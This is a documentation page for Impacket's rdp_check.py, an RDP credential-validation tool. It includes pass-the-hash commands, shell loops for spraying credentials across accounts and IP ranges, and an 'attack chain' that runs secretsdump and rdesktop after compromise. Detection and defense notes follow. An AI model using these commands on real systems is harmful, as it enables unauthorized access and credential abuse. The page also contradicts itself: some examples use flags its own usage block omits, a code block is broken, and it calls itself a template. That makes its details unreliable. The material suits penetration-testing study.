# rdp_check.py

## Overview
`rdp_check.py` is an RDP service credential validation tool in the Impacket suite. This tool is categorized under Protocol Testing and provides functionality for testing account validity on remote hosts using the RDP protocol with CredSSP authentication.

## Detailed Description
`rdp_check.py` implements partial RDP (Remote Desktop Protocol) and CredSSP (Credential Security Support Provider) functionality to test whether user credentials are valid on a target system without establishing a full RDP session. The tool performs the initial RDP negotiation, establishes a TLS connection, and completes NTLM authentication through CredSSP to verify credential validity.

The tool is particularly useful for credential validation during penetration testing, as it can confirm whether obtained credentials are valid for RDP access without triggering full logon events or consuming RDP licenses. It supports both password and hash-based authentication methods.

### Key Features:
- **Credential Validation**: Test username/password combinations against RDP services
- **Hash Authentication**: Support for NTLM hash-based authentication (Pass-the-Hash)
- **CredSSP Protocol**: Implementation of Credential Security Support Provider authentication
- **TLS Integration**: Secure credential testing over encrypted TLS channels
- **Minimal Footprint**: Tests credentials without full RDP session establishment
- **No License Consumption**: Avoids consuming RDP CALs during testing

### Technical Details:
- Implements RDP Connection Negotiation Request/Response handling
- Uses CredSSP (MS-CSSP) for secure credential validation
- Establishes TLS connection for encrypted communication
- Performs SPNEGO/NTLM authentication flow
- Compatible with modern Windows RDP implementations requiring CredSSP

## Command Line Options

```
usage: rdp_check.py [-h] [-ts] [-debug] [-hashes LMHASH:NTHASH] target

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH

Debug Options:
  -ts                   Add timestamp to every logging output
  -debug                Turn DEBUG output ON
```

## Usage Examples

### Basic Credential Testing
```bash
# Test with username and password
python3 rdp_check.py domain.com/user:password@192.168.1.100

# Test local account
python3 rdp_check.py administrator:password@192.168.1.100

# Test without domain
python3 rdp_check.py user:password@192.168.1.100
```

### Hash-based Authentication
```bash
# Pass-the-Hash testing
python3 rdp_check.py domain.com/user@192.168.1.100 \
  -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76

# Local account with hash
python3 rdp_check.py administrator@192.168.1.100 \
  -hashes aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
```

### Credential Spraying
```bash
# Test multiple users with same password
for user in admin administrator guest test; do
    echo "Testing $user"
    python3 rdp_check.py $user:Password123@192.168.1.100
done

# Test multiple targets
for ip in 192.168.1.{100..110}; do
    echo "Testing $ip"
    python3 rdp_check.py admin:password@$ip
done
```

# Using hash authentication
python3 rdp_check.py -hashes :ntlmhash domain.com/user@target.domain.com
```

### Advanced Usage
```bash
# Check RDP availability across multiple hosts
for host in $(cat servers.txt); do
    echo "Checking RDP on $host..."
    python3 rdp_check.py "$host"
done

# Test with different authentication methods
python3 rdp_check.py -username admin -password password123 192.168.1.100
python3 rdp_check.py -hashes :ntlmhash domain.com/user@192.168.1.100

# Check RDP with specific timeout for slow networks
python3 rdp_check.py -timeout 10 remote-server.domain.com
```

## Attack Chain Integration

### Remote Access Validation
```bash
# Step 1: Discover RDP-enabled hosts
nmap -p 3389 --script rdp-vuln-ms12-020 192.168.1.0/24

# Step 2: Validate RDP access with credentials
python3 rdp_check.py -username admin -password pass123 192.168.1.100

# Step 3: Establish RDP session for further exploitation
rdesktop -u admin -p pass123 192.168.1.100
```

### Post-compromise Access Verification
```bash
# Step 1: Extract credentials from compromised system
python3 secretsdump.py domain/user:pass@target

# Step 2: Test RDP access with extracted credentials
python3 rdp_check.py -hashes :extracted_hash domain/user@new_target

# Step 3: Establish RDP session if access confirmed
rdesktop -u user -H extracted_hash new_target
```

## Prerequisites
- Network access to target system on port 3389 (RDP)
- Valid credentials (username/password or NTLM hashes)
- Python 3.x with Impacket installed
- Target system must have RDP enabled

## Detection Considerations
- **Event IDs**: 
  - Event ID 4624/4625 (RDP logon success/failure)
  - Event ID 4778/4779 (RDP session connect/disconnect)
  - Event ID 21 (RDP-LocalSessionManager logs)
- **Network Indicators**: 
  - Connections to port 3389
  - RDP/CredSSP protocol traffic
  - SSL/TLS negotiation for RDP
- **Process Indicators**: 
  - Terminal Services processes (svchost.exe with TermService)
  - RDP-related service activity
- **File Indicators**: 
  - RDP cache files and temporary files
  - User profile activity
- **Registry Indicators**: 
  - RDP session registry entries
  - Terminal Services configuration changes

## Defensive Measures
- Enable RDP logging and monitoring (Event IDs 4778, 4779, 21)
- Implement Network Level Authentication (NLA)
- Use strong passwords and account lockout policies
- Deploy multi-factor authentication for RDP access
- Network segmentation to limit RDP exposure
- Regular monitoring of RDP access patterns

## Common Issues and Troubleshooting

### RDP Service Not Available
```bash
# Problem: Cannot connect to RDP service
# Solution: Verify RDP is enabled and accessible
nmap -p 3389 target_ip
telnet target_ip 3389
```

### Authentication Failures
```bash
# Problem: Valid credentials but authentication fails
# Solution: Check account policies and NLA requirements
# Verify account has "Allow log on through Remote Desktop Services" right
```

## Related Tools
- [secretsdump.py](secretsdump.md) - Extract credentials for RDP access
- [psexec.py](psexec.md) - Alternative remote execution method
- [wmiexec.py](wmiexec.md) - WMI-based remote execution
- rdesktop/xfreerdp - RDP clients for actual connections

---

*Note: This documentation is a template. Please refer to the actual tool's help output and source code for complete and accurate information.*
